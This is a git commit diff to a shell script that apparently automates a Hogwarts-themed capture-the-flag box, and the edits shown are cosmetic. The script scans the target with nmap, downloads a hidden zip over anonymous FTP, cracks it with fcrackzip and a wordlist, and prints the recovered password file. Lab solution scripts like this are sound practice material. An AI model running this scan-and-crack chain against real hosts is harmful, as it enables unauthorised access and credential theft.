f2f19efee7803e0dabc10e691ddd2701ca7447e8
0x734 <123769326+H3X-007@users.noreply.github.com>
2023-09-06 22:47:38 +0100

    Update TimeSaver.sh

--- Hogwarts/TimeSaver.sh
+++ Hogwarts/TimeSaver.sh
@@ -42,11 +42,11 @@ nmap_result=$(nmap -sV -p 1-20000 -T4 --min-rate 20000 "$IP")
 SSH_PORT=$(echo "$nmap_result" | grep 'ssh' | awk '{print $1}' | cut -d '/' -f 1)
 FTP_PORT=$(echo "$nmap_result" | grep 'ftp' | awk '{print $1}' | cut -d '/' -f 1)
 
-echo "the ssh port is : $SSH_PORT" > ssh_port.txt
+echo "The ssh port is : $SSH_PORT" > ssh_port.txt
 
 if [ -z "$FTP_PORT" ] || [ -z "$SSH_PORT" ]; then
   echo "Try again."
   exit 1
 fi
 
-wget --ftp-user=anonymous --ftp-password='' "ftp://$IP:$FTP_PORT/.../.../.I_saved_it_harry.zip" && mv .I_saved_it_harry.zip file.zip && fcrackzip -v -u -D -p $WORDLIST_PATH file.zip && unzip file.zip && cat boot/.pass && cat ssh_port.txt
+wget --ftp-user=anonymous --ftp-password='' "ftp://$IP:$FTP_PORT/.../.../.I_saved_it_harry.zip" && mv .I_saved_it_harry.zip file.zip && fcrackzip -v -u -D -p $WORDLIST_PATH file.zip && unzip file.zip && cat boot/.pass && echo "" && cat ssh_port.txt
